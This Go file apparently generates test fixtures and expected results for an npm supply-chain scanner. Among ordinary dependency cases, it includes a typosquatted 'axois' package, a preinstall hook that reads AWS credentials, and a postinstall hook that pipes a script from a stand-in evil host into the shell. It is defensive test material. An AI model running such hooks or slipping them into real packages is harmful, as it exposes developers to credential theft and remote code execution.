package validation

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// WriteCorpusFixtures writes all required test fixtures to the baseDir.
func WriteCorpusFixtures(baseDir string) error {
	fixtures := map[string]map[string]string{
		"npm-simple-deps": {
			"package.json": `{
  "name": "npm-simple-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
		},
		"npm-dev-deps": {
			"package.json": `{
  "name": "npm-dev-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}`,
		},
		"npm-peer-deps": {
			"package.json": `{
  "name": "npm-peer-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "peerDependencies": {
    "react": "^18.0.0"
  }
}`,
		},
		"npm-optional-deps": {
			"package.json": `{
  "name": "npm-optional-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "optionalDependencies": {
    "fsevents": "^2.3.2"
  }
}`,
		},
		"npm-workspaces": {
			"package.json": `{
  "name": "workspaces-root",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "workspaces": [
    "packages/*"
  ],
  "dependencies": {
    "lodash": "^4.17.21"
  }
}`,
			"packages/subapp/package.json": `{
  "name": "subapp",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "axios": "^1.6.0"
  }
}`,
		},
		"npm-lock-transitive": {
			"package.json": `{
  "name": "lockfile-transitive-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "axios": "^1.6.0"
  }
}`,
			"package-lock.json": `{
  "name": "lockfile-transitive-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "lockfile-transitive-app",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "axios": "^1.6.0"
      }
    },
    "node_modules/axios": {
      "version": "1.6.0",
      "resolved": "https://registry.npmjs.org/axios/-/axios-1.6.0.tgz",
      "integrity": "sha512-axios-integrity-hash",
      "dependencies": {
        "follow-redirects": "^1.15.0"
      }
    },
    "node_modules/follow-redirects": {
      "version": "1.15.0",
      "resolved": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.15.0.tgz",
      "integrity": "sha512-redirects-integrity-hash",
      "dev": false
    }
  }
}`,
		},
		"js-ts-imports": {
			"package.json": `{
  "name": "js-ts-imports",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`,
			"index.ts": `import lodash from "lodash";
import * as fs from "fs";
import "./local-file";
require("express");
import("axios");
`,
		},
		"typosquat-pkg": {
			"package.json": `{
  "name": "axois",
  "version": "1.0.0",
  "description": "Typosquatted package"
}`,
		},
		"credential-reading-pkg": {
			"package.json": `{
  "name": "cred-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "cat ~/.aws/credentials"
  }
}`,
		},
		"postinstall-curl-pkg": {
			"package.json": `{
  "name": "curl-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://evil.example/script.sh | sh"
  }
}`,
		},
		"malformed-package-json": {
			"package.json": `{
  "name": "malformed",
  "dependencies": {
    "lodash":
  }
}`,
		},
		"malformed-lockfile": {
			"package.json": `{
  "name": "malformed-lockfile",
  "version": "1.0.0"
}`,
			"package-lock.json": `{
  "name": "malformed",
  "packages":
}`,
		},
		"scoped-packages": {
			"package.json": `{
  "name": "scoped-pkg-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "@babel/core": "^7.0.0"
  }
}`,
			"package-lock.json": `{
  "name": "scoped-pkg-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "scoped-pkg-app",
      "version": "1.0.0",
      "license": "MIT",
      "repository": "github:user/repo",
      "dependencies": {
        "@babel/core": "^7.0.0"
      }
    },
    "node_modules/@babel/core": {
      "version": "7.20.0",
      "resolved": "https://registry.npmjs.org/@babel/core/-/core-7.20.0.tgz",
      "integrity": "sha512-core-integrity-hash"
    }
  }
}`,
		},
		"duplicate-dependencies": {
			"package.json": `{
  "name": "dup-deps",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "lodash": "^4.17.21",
    "lodash": "^4.17.20"
  }
}`,
		},
		"npm-alias-specs": {
			"package.json": `{
  "name": "alias-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "dependencies": {
    "my-lodash": "npm:lodash@^4.17.21"
  }
}`,
		},
		"workspace-references": {
			"package.json": `{
  "name": "workspace-ref-root",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo",
  "workspaces": [
    "packages/*"
  ],
  "dependencies": {
    "subapp": "workspace:*"
  }
}`,
		},
	}

	for name, files := range fixtures {
		dir := filepath.Join(baseDir, name)
		if err := os.MkdirAll(dir, 0755); err != nil {
			return fmt.Errorf("create fixture dir %s: %w", name, err)
		}
		for filename, content := range files {
			path := filepath.Join(dir, filename)
			// Create parent directory if it's a nested file
			if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
				return fmt.Errorf("create file dir %s: %w", filepath.Dir(path), err)
			}
			if err := os.WriteFile(path, []byte(content), 0644); err != nil {
				return fmt.Errorf("write fixture file %s/%s: %w", name, filename, err)
			}
		}
	}

	// Generate huge lockfile programmatically
	hugeDir := filepath.Join(baseDir, "huge-lockfile")
	if err := os.MkdirAll(hugeDir, 0755); err != nil {
		return fmt.Errorf("create huge-lockfile dir: %w", err)
	}
	hugePkgJSON := `{
  "name": "huge-lockfile-app",
  "version": "1.0.0",
  "license": "MIT",
  "repository": "github:user/repo"
}`
	if err := os.WriteFile(filepath.Join(hugeDir, "package.json"), []byte(hugePkgJSON), 0644); err != nil {
		return err
	}
	hugeLockfile := generateHugeLockfile()
	if err := os.WriteFile(filepath.Join(hugeDir, "package-lock.json"), []byte(hugeLockfile), 0644); err != nil {
		return err
	}

	return nil
}

func generateHugeLockfile() string {
	var sb strings.Builder
	sb.WriteString(`{
  "name": "huge-lockfile-app",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "packages": {
    "": {
      "name": "huge-lockfile-app",
      "version": "1.0.0"
    }`)
	for i := 1; i <= 600; i++ {
		sb.WriteString(fmt.Sprintf(`,
    "node_modules/pkg-%d": {
      "version": "1.0.0"
    }`, i))
	}
	sb.WriteString(`
  }
}`)
	return sb.String()
}

// WriteGoldenResults writes the golden expected results file to path.
func WriteGoldenResults(path string) error {
	type ExpDep struct {
		Name           string `json:"package_name"`
		DependencyType string `json:"dependency_type"`
		Direct         bool   `json:"direct"`
	}
	type FixtureExpectation struct {
		ExpectedDeps     []ExpDep `json:"expected_dependencies"`
		ExpectedDecision string   `json:"expected_decision"`
		MinScore         int      `json:"min_score"`
		MaxScore         int      `json:"max_score"`
	}

	data := map[string]FixtureExpectation{
		"npm-simple-deps": {
			ExpectedDeps: []ExpDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-dev-deps": {
			ExpectedDeps: []ExpDep{
				{Name: "typescript", DependencyType: "dev", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-peer-deps": {
			ExpectedDeps: []ExpDep{
				{Name: "react", DependencyType: "peer", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-optional-deps": {
			ExpectedDeps: []ExpDep{
				{Name: "fsevents", DependencyType: "optional", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-workspaces": {
			ExpectedDeps: []ExpDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
				{Name: "axios", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-lock-transitive": {
			ExpectedDeps: []ExpDep{
				{Name: "axios", DependencyType: "production", Direct: true},
				{Name: "follow-redirects", DependencyType: "transitive", Direct: false},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"js-ts-imports": {
			ExpectedDeps: []ExpDep{
				{Name: "lodash", DependencyType: "source-import", Direct: true},
				{Name: "express", DependencyType: "source-import", Direct: true},
				{Name: "axios", DependencyType: "source-import", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"typosquat-pkg": {
			ExpectedDeps:     []ExpDep{},
			ExpectedDecision: "warn",
			MinScore:         25,
			MaxScore:         50,
		},
		"credential-reading-pkg": {
			ExpectedDeps:     []ExpDep{},
			ExpectedDecision: "block",
			MinScore:         100,
			MaxScore:         150,
		},
		"postinstall-curl-pkg": {
			ExpectedDeps:     []ExpDep{},
			ExpectedDecision: "block",
			MinScore:         100,
			MaxScore:         150,
		},
		"malformed-package-json": {
			ExpectedDeps:     []ExpDep{},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"malformed-lockfile": {
			ExpectedDeps:     []ExpDep{},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"scoped-packages": {
			ExpectedDeps: []ExpDep{
				{Name: "@babel/core", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"duplicate-dependencies": {
			ExpectedDeps: []ExpDep{
				{Name: "lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"npm-alias-specs": {
			ExpectedDeps: []ExpDep{
				{Name: "my-lodash", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
		"workspace-references": {
			ExpectedDeps: []ExpDep{
				{Name: "subapp", DependencyType: "production", Direct: true},
			},
			ExpectedDecision: "allow",
			MinScore:         0,
			MaxScore:         10,
		},
	}

	// Generate expected huge lockfile deps list
	hugeExpectation := FixtureExpectation{
		ExpectedDeps:     make([]ExpDep, 0, 600),
		ExpectedDecision: "allow",
		MinScore:         0,
		MaxScore:         10,
	}
	for i := 1; i <= 600; i++ {
		hugeExpectation.ExpectedDeps = append(hugeExpectation.ExpectedDeps, ExpDep{
			Name:           fmt.Sprintf("pkg-%d", i),
			DependencyType: "transitive",
			Direct:         false,
		})
	}
	data["huge-lockfile"] = hugeExpectation

	b, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, b, 0644)
}
